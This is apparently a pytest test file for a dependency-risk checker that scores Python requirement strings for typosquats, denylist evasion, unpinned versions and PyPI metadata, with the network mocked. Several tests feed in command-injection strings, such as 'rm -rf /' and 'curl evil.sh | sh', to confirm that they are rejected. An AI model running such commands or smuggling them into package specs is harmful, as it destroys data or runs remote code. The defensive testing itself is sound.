"""Tests for plugins.dependency_risk: pure heuristics, network disabled so
results are deterministic and offline."""
import pytest

from plugins import dependency_risk as risk


def test_malformed_spec_is_always_high_risk():
    r = risk.assess_requirement("requests; rm -rf /", network_check=False)
    assert r.valid is False
    assert r.level == "high"


def test_shell_metacharacters_rejected():
    for hostile in ["pkg && curl evil.sh | sh", "pkg`whoami`", "pkg==1.0 -e git+https://evil"]:
        r = risk.assess_requirement(hostile, network_check=False)
        assert r.valid is False, hostile
        assert r.level == "high"


def test_allowlisted_package_is_low_risk_regardless():
    r = risk.assess_requirement("requests==2.31.0", allowlist={"requests"}, network_check=False)
    assert r.level == "low"
    assert r.score == 0


def test_denylisted_package_is_high_risk():
    r = risk.assess_requirement("evilpkg==1.0", denylist={"evilpkg"}, allowlist=set(), network_check=False)
    assert r.level == "high"
    assert r.score == 100


def test_denylist_cannot_be_bypassed_by_name_normalization():
    # PEP 503: evil-pkg == evil_pkg == Evil.Pkg -- all the same distribution.
    for variant in ["evil_pkg==1.0", "Evil.Pkg==1.0", "evil--pkg==1.0", "EVIL_PKG==1.0"]:
        r = risk.assess_requirement(variant, denylist={"evil-pkg"}, allowlist=set(), network_check=False)
        assert r.level == "high", variant
        assert r.score == 100, variant


def test_allowlist_matches_across_normalization():
    r = risk.assess_requirement("Foo_Bar==1.0", allowlist={"foo-bar"}, denylist=set(), network_check=False)
    assert r.level == "low"
    assert r.score == 0


def test_canonical_name_collapses_separators():
    assert risk.canonical_name("Foo_Bar") == "foo-bar"
    assert risk.canonical_name("foo.bar") == "foo-bar"
    assert risk.canonical_name("foo--_..bar") == "foo-bar"
    assert risk.spec_name("Foo_Bar==1.0") == "foo-bar"


def test_unpinned_dependency_adds_risk():
    pinned = risk.assess_requirement("somepkg==1.0.0", allowlist=set(), network_check=False)
    unpinned = risk.assess_requirement("somepkg", allowlist=set(), network_check=False)
    assert unpinned.score > pinned.score
    assert any("unpinned" in r for r in unpinned.reasons)


def test_typosquat_of_popular_package_is_flagged():
    r = risk.assess_requirement("reqeusts==1.0.0", allowlist=set(), denylist=set(), network_check=False)
    assert r.level == "high"
    assert any("typosquat" in reason for reason in r.reasons)


def test_already_installed_package_reduces_risk():
    installed = risk.assess_requirement("pytest", allowlist=set(), network_check=False)
    not_installed = risk.assess_requirement("totally_unknown_package_xyz", allowlist=set(), network_check=False)
    assert installed.already_installed is True
    assert not_installed.already_installed is False
    assert installed.score < not_installed.score
    assert installed.level == "low"


@pytest.mark.parametrize("name,pkg", [("yaml", "pyyaml"), ("bs4", "beautifulsoup4"), ("PIL", "pillow")])
def test_import_to_package_resolution(name, pkg):
    assert risk.resolve_import_name(name) == pkg


def test_detect_missing_imports_ignores_stdlib_and_installed():
    src = "import os\nimport json\nimport totally_unknown_package_xyz\n"
    missing = risk.detect_missing_imports(src)
    assert missing == ["totally_unknown_package_xyz"]


def test_detect_missing_imports_handles_syntax_error_gracefully():
    assert risk.detect_missing_imports("def broken(:\n") == []


def test_network_lookup_failure_is_conservative_not_fatal(monkeypatch):
    monkeypatch.setattr(risk, "_pypi_lookup", lambda name, timeout: None)
    r = risk.assess_requirement("somepkg==1.0.0", allowlist=set(), network_check=True)
    assert any("could not verify" in reason for reason in r.reasons)
    assert r.level in ("low", "medium", "high")  # never raises


# ---- PyPI network branch (#14): mock urlopen, no real network ----------------
import json as _json
import urllib.error


class _FakeResp:
    def __init__(self, status, body):
        self.status = status
        self._body = body

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def _patch_urlopen(monkeypatch, fn):
    monkeypatch.setattr(risk.urllib.request, "urlopen", fn)


def test_pypi_lookup_found_old_package_scores_low(monkeypatch):
    payload = {"releases": {"1.0": [{"upload_time_iso_8601": "2015-01-01T00:00:00Z"}],
                            "1.1": [{"upload_time_iso_8601": "2016-01-01T00:00:00Z"}],
                            "1.2": [{"upload_time_iso_8601": "2017-01-01T00:00:00Z"}]}}
    _patch_urlopen(monkeypatch, lambda url, timeout=None: _FakeResp(200, _json.dumps(payload).encode()))
    r = risk.assess_requirement("somepkg==1.2", allowlist=set(), denylist=set(), network_check=True)
    assert r.level == "low"
    assert not any("could not verify" in reason for reason in r.reasons)


def test_pypi_lookup_not_found_scores_high(monkeypatch):
    _patch_urlopen(monkeypatch, lambda url, timeout=None: _FakeResp(200, _json.dumps({"releases": {}}).encode()))
    r = risk.assess_requirement("ghostpkg==1.0", allowlist=set(), denylist=set(), network_check=True)
    assert r.level == "high"
    assert any("not found on PyPI" in reason for reason in r.reasons)


def test_pypi_lookup_brand_new_package_flagged(monkeypatch):
    import datetime
    recent = (datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=3)).isoformat()
    payload = {"releases": {"0.1": [{"upload_time_iso_8601": recent}],
                            "0.2": [{"upload_time_iso_8601": recent}],
                            "0.3": [{"upload_time_iso_8601": recent}]}}
    _patch_urlopen(monkeypatch, lambda url, timeout=None: _FakeResp(200, _json.dumps(payload).encode()))
    r = risk.assess_requirement("freshpkg==0.3", allowlist=set(), denylist=set(), network_check=True)
    assert any("first published only" in reason for reason in r.reasons)


def test_pypi_lookup_http_error_is_conservative(monkeypatch):
    def _boom(url, timeout=None):
        raise urllib.error.HTTPError(url, 404, "Not Found", {}, None)
    _patch_urlopen(monkeypatch, _boom)
    r = risk.assess_requirement("somepkg==1.0", allowlist=set(), denylist=set(), network_check=True)
    assert any("could not verify" in reason for reason in r.reasons)


def test_pypi_lookup_malformed_json_is_conservative(monkeypatch):
    _patch_urlopen(monkeypatch, lambda url, timeout=None: _FakeResp(200, b"not json{{{"))
    r = risk.assess_requirement("somepkg==1.0", allowlist=set(), denylist=set(), network_check=True)
    assert any("could not verify" in reason for reason in r.reasons)
